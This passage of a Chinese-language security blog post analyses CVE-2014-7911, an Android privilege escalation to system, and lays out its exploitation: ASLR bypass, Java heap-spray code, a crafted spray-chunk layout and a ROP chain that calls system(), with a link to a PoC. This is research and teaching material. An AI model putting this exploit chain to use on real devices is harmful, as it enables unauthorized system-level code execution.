<p>注意上述refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致代码执行。<br>我们上面提到我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针。</p>
<h3 id="汇编代码分析"><a href="#汇编代码分析" class="headerlink" title="汇编代码分析"></a>汇编代码分析</h3><p>注意我这里添加了一张汇编图示，我导入的是没有strip过的libutils.so，这样IDA中解释出的信息更加丰富。<br>下面看一下发生异常时最后调用的RefBase:decStrong的汇编代码。将libutils.so拖入IDA Pro，查看Android::RefBase::decStrong函数。分析时需要牢记的是，攻击者能够控制r0(this指针)：<br><img src="/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_1.png" alt="1"><br><img src="/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_2.png" alt="2"><br>首先对r0的使用，是在decStrong的前下面三行代码之中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weakref_impl* <span class="keyword">const</span> refs = mRefs;</div><div class="line">refs-&gt;removeStrongRef(id);</div><div class="line"><span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</div></pre></td></tr></table></figure></p>
<p>对应的汇编代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ldr r4, [r0, #4]   # r0为this指针，r4为mRefs</div><div class="line">mov r6, r1</div><div class="line">mov r0, r4</div><div class="line">blx &lt;android_atomic_dec ()&gt;</div></pre></td></tr></table></figure></p>
<p>首先，mRefs被加载到r4。（r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容）<br>然后，android_atomic_dec函数被调用，传入参数&amp;refs-&gt;mStrong。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</div></pre></td></tr></table></figure></p>
<p>这被翻译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov r0, r4  # r4指向mStrong，r0指向mStrong</div><div class="line">blx &lt;android_atomic_dec ()&gt;</div></pre></td></tr></table></figure></p>
<p>作为函数参数，上述r0就是&amp;refs-&gt;mStrong。注意，mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。<br>另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。如下所示：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">removeStrongRef</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="comment">/*id*/</span>)</span> </span>&#123; &#125;</div></pre></td></tr></table></figure></p>
<p>在调用android_atomic_dec后，出现的是以下代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</div><div class="line">	refs-&gt;mBase-&gt;onLastStrongRef(id);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对应的汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cmp r0, #1          # r0 = refs-&gt;mStrong</div><div class="line">bne.n d1ea</div><div class="line">ldr r0, [r4, #8]    # r4 = &amp;refs-&gt;mStrong</div><div class="line">mov r1, r6</div><div class="line">ldr r3, [r0, #0] </div><div class="line">ldr r2, [r3, #12]</div><div class="line">blx r2</div></pre></td></tr></table></figure></p>
<p>注意，android_atomic_dec函数执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)(即：blx r2)，攻击者需要使refs-&gt;mStrong为1。<br>至此，可以看出攻击者为了实现代码执行，需要满足如下约束条件：</p>
<ol>
<li>drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域;</li>
<li>refs-&gt;mStrong必须为1;</li>
<li>refs-&gt;mBase-&gt;onLastStrongRef(id)需要执行成功。并最终指向可执行的内存区域。即满足：<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</div><div class="line">	refs = *(mOrgue+<span class="number">4</span>);</div><div class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">12</span>);</div><div class="line">	blx r2 ; &lt;—— controlled;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>除此以外，攻击者还必须克服Android中的漏洞缓解技术——ASLR和DEP。</p>
</blockquote>
<p>我们可以看到这里使用了三层指针的跳转，最终才拿到控制权。mOrgue需要指向攻击者可控的内存，怎样做到？下面我将结合参考文献以及retme7提供的POC进行翻译和理解。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h3><p>Android有做地址空间随机化ASLR，但是所有的app都是fork自zygote进程，基础模块的内存布局全部是相同的，也就是说我们可以简单的绕过system_server的ASLR。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">shell@hammerhead:/ # cat /proc/10156/maps | grep dalvik-heap</div><div class="line">4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)</div><div class="line">shell@hammerhead:/ # cat /proc/18446/maps | grep dalvik-heap</div><div class="line">4273c000-616da000 rw-p 00000000 00:04 32910      /dev/ashmem/dalvik-heap (deleted)</div></pre></td></tr></table></figure></p>
<h3 id="Dalvik-heap-spary"><a href="#Dalvik-heap-spary" class="headerlink" title="Dalvik-heap spary"></a>Dalvik-heap spary</h3><p>Dalvik-heap是储存Java对象实例的一片由Dalvik虚拟机管理的内存区，它的内存布局也是来自zygote进程，在所有app进程中都是相同的。<br>system_server进程向android设备提供绝大部分的系统服务，通过这些服务的一些特定方法我们可以向system_server传输一个String，同时system_server把这个String存储在Dalvik-heap中不被销毁（因为我们需要使用注入代码段对这片内存区域进行填充）。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapSpary</span><span class="params">(String str)</span> </span>&#123;</div><div class="line"><span class="comment">//    str = str + generateString(16);</span></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        IntentFilter inFilter = <span class="keyword">new</span> IntentFilter();</div><div class="line"><span class="comment">//        inFilter.addAction(generateString(16));</span></div><div class="line">        registerReceiver(broadcastReceiver, inFilter, str, <span class="keyword">null</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我屏蔽了retme7的POC中的两行代码，经过测试并没有影响。<br>首先，看一下registerReceiver方法的声明：</p>
<pre><code>public Intent registerReceiver(BroadcastReceiver receiver, IntentFilter filter, String broadcastPermission, Handler scheduler)
</code></pre><p>其中broadcastPermission参数为一个String类型，方法调用完成后，String buffer将常驻system_server内存空间，并且不会被销毁。接下来，将结合Android4.4.4_r1源码简单分析下registerReceiver方法是如何将String传递进并常驻在system_server进程的：<br><code>ContextWrapper.registerReceiver-&gt;ContextImpl.registerReceiver-&gt;ContextImpl.registerReceiverInternal-&gt;ActivityManagerProxy.registerReceiver-&gt;ActivityManagerService.registerReceiver</code><br>注意ActivityManagerProxy.registerReceiver方法里通过Binder驱动程序就进入到了ActivityManagerService中的registerReceiver方法中，也就是进入到了system_server进程里。<br>贴出ActivityManagerService.registerReceiver方法的关键部分：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Intent <span class="title">registerReceiver</span><span class="params">(IApplicationThread caller, String callerPackage, IIntentReceiver receiver, IntentFilter filter, String permission, <span class="keyword">int</span> userId)</span> </span>&#123;</div><div class="line">enforceNotIsolatedCaller(<span class="string">"registerReceiver"</span>);</div><div class="line">	<span class="keyword">int</span> callingUid;</div><div class="line">	<span class="keyword">int</span> callingPid;</div><div class="line">	<span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</div><div class="line">		......</div><div class="line">	    ReceiverList rl</div><div class="line">	        = (ReceiverList)mRegisteredReceivers.get(receiver.asBinder());</div><div class="line">	    ......</div><div class="line">	    BroadcastFilter bf = <span class="keyword">new</span> BroadcastFilter(filter, rl, callerPackage,</div><div class="line">            permission, callingUid, userId);</div><div class="line">	    rl.add(bf);</div><div class="line">	    ......</div><div class="line">	    <span class="keyword">return</span> sticky;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">BroadcastFilter bf = <span class="keyword">new</span> BroadcastFilter(filter, rl, callerPackage,</div><div class="line">       permission, callingUid, userId);</div><div class="line">rl.add(bf);</div></pre></td></tr></table></figure></p>
<p>就将传递进的String buffer即此处的permission常驻在system_server内存空间。<br>最后反复调用heapSpary，完成Dalvik-heap spary：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++) &#123;</div><div class="line">    heapSpary(str);</div><div class="line">    <span class="keyword">if</span> (i % <span class="number">100</span> == <span class="number">0</span>) &#123;</div><div class="line">        Log.d(TAG, <span class="string">"heap sparying... "</span> + i);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="Spray-addresses-manipulation"><a href="#Spray-addresses-manipulation" class="headerlink" title="Spray addresses manipulation"></a>Spray addresses manipulation</h3><p>方便请见，再次贴出实现代码执行的约束条件：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</div><div class="line">	refs = *(mOrgue+<span class="number">4</span>);</div><div class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">12</span>);</div><div class="line">	blx r2 ; &lt;—— controlled;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>完成system_server进程的堆喷射后，我们遇到另一个问题-虽然我们的spray chunk充满了system_server内存空间，mOrgue也确实指向可读的spray chunk，然而我们上面提到由于此漏洞的特殊型，需要控制其三重指针的调用，所以我们还需要构造特殊的spray chunk，使得mOrgue每次指向相同的偏移。<br>下面是构造后的spray chunk的结构图（图来自参考文献）：<br><img src="/images/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability_3.png" alt="3"><br>简单解释一下：<br>STATIC_ADDRESS是我们传递进来的mOrgue<br>GADGET_CHUNK_OFFSET是GADGET_CHUNK在spray chunk的偏移<br>STATIC_ADDRESS = Beginning_of_spray + 4 * N<br>[STATIC_ADDRESS] = STATIC_ADDRESS + GADGET_CHUNK_OFFSET - 4 * N<br>    = Beginning_of_spray + 4 * N + GADGET_CHUNK_OFFSET - 4 * N<br>    = Beginning_of_spray + GADGET_CHUNK_OFFSET<br>    =  GADGET_CHUNK_ADDR<br>这样只要确保STATIC_ADDRESS每次都位于Relative Addresses Chunk区域（spray chunk中Relative Addresses Chunk的比例远大于Gadget Chunk），就可保证STATIC_ADDRESS每次都指向GADGET_CHUNK_ADDR。<br>重新回头分析汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ldr r4, [r0, #4]   # r0为this指针，r4为mRefs</div><div class="line">mov r6, r1</div><div class="line">mov r0, r4</div><div class="line">blx &lt;android_atomic_dec ()&gt;</div><div class="line">cmp r0, #1</div></pre></td></tr></table></figure></p>
<p>为了控制后续程序流程，r0的值必须为1</p>
<pre><code>ldr r4, [r0, #4] --&gt; r4=[STATIC_ADDRESS + 4] --&gt; r4=GADGET_CHUNK_ADDR - 4
</code></pre><p>[r4]的值为1，即[GADGET_CHUNK_ADDR - 4]的值为1。cmp比较成立，进入下面的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">r4=GADGET_CHUNK_ADDR - 4</div><div class="line">ldr r0, [r4, #8]    # r4 = &amp;refs-&gt;mStrong</div><div class="line">r0=[GADGET_CHUNK_ADDR + 4]</div><div class="line">mov r1, r6</div><div class="line">ldr r3, [r0, #0] </div><div class="line">r3=[[GADGET_CHUNK_ADDR + 4]]</div></pre></td></tr></table></figure></p>
<p>为了方便之后的布局，设置[GADGET_CHUNK_ADDR + 4] =STATIC_ADDRESS + 12，则：<br><code>r3=[STATIC_ADDRESS + 12]</code><br><code>r3=GADGET_CHUNK_ADDR - 12</code><br>接着往下看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ldr r2, [r3, #12]</div><div class="line">r2=[GADGET_CHUNK_ADDR]</div><div class="line">blx r2</div></pre></td></tr></table></figure></p>
<p>这样，我们就完成了spary chunk的布局，Spray addresses manipulation完毕</p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>由于DEP（Data Execution Prevention）的原因，Dalvik堆上的内存不能用来执行。需要通过ROP技术绕过DEP，执行代码（我们选择执行system函数，然后通过system函数调用外部程序）。<br>这里首先用到了一个寻找ROP链的工具：<br><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">https://github.com/JonathanSalwan/ROPgadget</a><br>注意：<br>只用基础模块:libc libandroid_runtime …（会被zygote加载的模块，保证内存布局的一致）<br>可以把arm code当做thumb code来搜索,增加更多的可能<br>为了控制R0寄存器使其指向system函数的参数（命令字符串），我们选择用stack pivot（将控制的堆内存交换栈上,即复写SP）技术将字符串压入堆栈，然后通过pop将字符串地址赋给R0。<br>第一个gadget：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">r5=STATIC_ADDRESS</div><div class="line">ldr r7, [r5]</div><div class="line">r7=GADGET_CHUNK_ADDR</div><div class="line">mov r0, r5</div><div class="line">r0=STATIC_ADDRESS</div><div class="line">ldr r1, [r7, #8]</div><div class="line">r1=[GADGET_CHUNK_ADDR + 8]</div><div class="line">blx r1</div></pre></td></tr></table></figure></p>
<p>通过r1跳转到第二个gadget：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">r7=GADGET_CHUNK_ADDR</div><div class="line">add.w r7, r7, #8</div><div class="line">r7=GADGET_CHUNK_ADDR + 8</div><div class="line">mov sp, r7</div><div class="line">sp = GADGET_CHUNK_ADDR + 8</div><div class="line">pop &#123;r4, r5, r7, pc&#125;</div><div class="line">r4=[GADGET_CHUNK_ADDR + 8]</div><div class="line">r5=[GADGET_CHUNK_ADDR + 12]=system_addr</div><div class="line">r7=[GADGET_CHUNK_ADDR + 16]</div><div class="line">pc=[GADGET_CHUNK_ADDR + 20]</div></pre></td></tr></table></figure></p>
<p>这里我提前将system函数的地址写入[GADGET_CHUNK_ADDR + 12]。<br>有一个问题，为什么要通过第一个gadget的过渡，才完成stack pivot？<br>答:事实上是不得已而为之，我用ROPgadget扫描了整个/system/lib目录下的基础模块的”mov sp, r”，只发现有mov sp, r7，所以只能采取这种过度的方式。<br>继续来到第三个gadget：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sp=[GADGET_CHUNK_ADDR + 24]</div><div class="line">mov r0, sp</div><div class="line">r5=system_addr</div><div class="line">blx r5</div></pre></td></tr></table></figure></p>
<p>如此，我们将命令字符串放在GADGET_CHUNK_ADDR + 24开始的空间就可以了，最终完成了对CVE-2014-7911漏洞的system权限提权，并执行任意代码。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>虽然retme7大神早就发布了POC,还是把我修改整理过的POC传到github上,就当保存一下。(只适用nexus5 Android4.4.4_r1)<br><a href="https://github.com/ele7enxxh/CVE-2014-7911" target="_blank" rel="external">https://github.com/ele7enxxh/CVE-2014-7911</a></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="http://seclists.org/fulldisclosure/2014/Nov/51" target="_blank" rel="external">http://seclists.org/fulldisclosure/2014/Nov/51</a></li>
<li><a href="http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation" target="_blank" rel="external">http://researchcenter.paloaltonetworks.com/2015/01/cve-2014-7911-deep-dive-analysis-android-system-service-vulnerability-exploitation</a></li>
<li><a href="http://drops.wooyun.org/papers/6082" target="_blank" rel="external">http://drops.wooyun.org/papers/6082</a></li>
<li><a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-7911_poc</a></li>
<li><a href="https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf" target="_blank" rel="external">https://github.com/retme7/My-Slides/blob/master/xKungfooSH%40retme.pdf</a></li>
</ol>

      
    </div>

    
      
      

  <div class="post-copyright">
    <p class="copyright-item">
      <span>作者: </span>
      <span>ele7enxxh</span>
    </p>
    <p class="copyright-item">
      <span>来源: </span>
      <a href="http://ele7enxxh.com">http://ele7enxxh.com</a>
    </p>
    <p class="copyright-item">
      <span>链接: </span>
      <a href="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html">http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html</a>
    </p>

    <p class="copyright-item lincese">
      
      本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
    </p>
  </div>



      
      
    

    
  </article>


          </div>
          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>

        </div>  
      </main>

      <footer id="footer" class="footer">

  <div class="social-links">
    
      
        
          <a href="mailto:ele7enxxh@qq.com" class="iconfont icon-email" title="email"></a>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
        
          <a href="https://github.com/ele7enxxh" class="iconfont icon-github" title="github"></a>
        
      
    
      
        
          <a href="http://weibo.com/ele7enxxh" class="iconfont icon-weibo" title="weibo"></a>
        
      
    
      
    
      
    
    
    
      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    
  </div>


<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
  </span>
  
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">
    
    &copy; 
     
      2015 - 
    
    2017

    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">ele7enxxh</span>
  </span>
</div>
      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>

    
  
  
  <script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html';
        this.page.identifier = 'CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html';
        this.page.title = 'CVE-2014-7911安卓本地提权漏洞详细分析';
    };
    (function() {
    var d = document, s = d.createElement('script');

    s.src = '//ele7enxxh.disqus.com/embed.js';

    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();  
  </script>




    
  





  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  

  
    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  


    <script type="text/javascript" src="/js/src/even.js?v=2.2.x"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=2.2.x"></script>

    
  <script type="text/html" id="search-result">
    <article class="post">
      <header class="post-header">
        <h1 class="post-title">
          <a href="$url$" class="post-link">
            $title$
          </a>
        </h1>
      </header>
      <div class="post-content">
        $content$
        <div class="read-more">
          <a href="$url$" class="read-more-link">
            Read more..
          </a>
        </div>
      </div>
    </article>
  </script>
  <script type="text/html" id="no-search-result">
    <div class="no-result">
      <h2>No result found!</h2>
    </div>
  </script>
  <script type="text/javascript" src="/js/src/search.js?v=2.2.x"></script>

  </body>
</html>